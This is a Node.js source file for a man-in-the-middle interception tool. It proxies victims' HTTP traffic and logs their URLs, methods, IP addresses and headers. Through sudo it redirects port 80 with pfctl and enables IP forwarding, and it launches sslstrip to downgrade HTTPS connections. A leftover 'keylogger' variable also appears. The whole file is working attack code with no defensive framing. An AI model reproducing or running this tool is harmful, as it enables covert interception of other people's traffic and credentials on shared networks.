const http = require('http')
const util =  require('util');
const ip   =  require('ip');
const events =  require('events');
const connect =  require('connect');
const httpProxy =  require('http-proxy');
const child_process =  require('child_process');
const transformerProxy =  require('transformer-proxy');

var verthproxy = require('../utils/proxy')


const exec = child_process.exec;

var exports = module.exports = new events.EventEmitter();

var trace = {}

var keylogger = 0

var hostIP = ip.address()

var init = function (options) {
  options = options || { port: 8080 }
  var proxy = httpProxy.createServer({
    target: 'http://'+hostIP+':10000'
  , ws: true
  });
  proxy.on('proxyReq', request);
  proxy.on('proxyRes', response);
  proxy.on('error', function(err, req, res) {
    res.end();
  })
  var app = connect();
  //app.use(transformerProxy(inject));  // , {match : /\.js([^\w]|$)/}
  app.use( function (req, res) {
    if (req.headers.host == hostIP+':3000') {
      proxy.web(req, res, { target: 'http://'+hostIP+':3000' });
    } else {
      proxy.web(req, res, { target: 'http://'+hostIP+':10000' });
    }
    // req.on('end', function(){
    //   setTimeout(function(){
    //     keylogger = 0
    //   }, 1000)
    // })
  });
  http.createServer(app).listen(options.port);
  enablePortForwarding()
  startSSLStripAttack()
}

var request = function (proxyRequest, req, res, options) {
  trace.code = res.statusCode
  trace.method = proxyRequest.method
  trace.url = proxyRequest.agent.protocol + '//' + req.headers.host + proxyRequest.path
}

var response = function (proxyResponse, req, res) {
  proxyResponse.on('end', function(){
    var headers = parser.headers(proxyResponse.headers)                                          // Template Engine?
    if (headers != false) {
      var ipAddr = req.headers["x-forwarded-for"];
      if (ipAddr){
        var list = ipAddr.split(",");
        ipAddr = list[list.length-1];
      } else {
        ipAddr = req.connection.remoteAddress;
      }
      ipAddr = ipAddr.split(':')
      ipAddr = ipAddr[ipAddr.length - 1]
      exports.emit('output', {
        url: trace.url
      , method: trace.method
      , ip: ipAddr
      , code: trace.code
      , headers: headers
      });
    }
  })
}

var parser = {
  headers: function(headers) {
    if ( (typeof headers['content-length'] == "undefined") ||
         (typeof headers['content-type'] == "undefined") )
      return false;
    return {
      "mime"  : headers['content-type']
    , "length": headers['content-length']
    , "Cache-Control": "no-cache, no-store, must-revalidate"
    , "Pragma": "no-cache"
    , "Expires": 0
    }
  }
}

var enablePortForwarding = function(){
  exec('echo "rdr pass inet proto tcp from any to any port 80 -> 127.0.0.1 port 8080" | sudo pfctl -ef -')
  exec('sudo sysctl -w net.inet.ip.forwarding=1')
  exec('sudo sysctl -w net.inet.ip.fw.enable=1')
}

function startSSLStripAttack(){
  exec('sudo forever start -c python ../bin/sslstrip/sslstrip.py -k -p')
}

function stopSSLStripAttack(){
  exec('sudo forever stopall')
}

exports.init = init
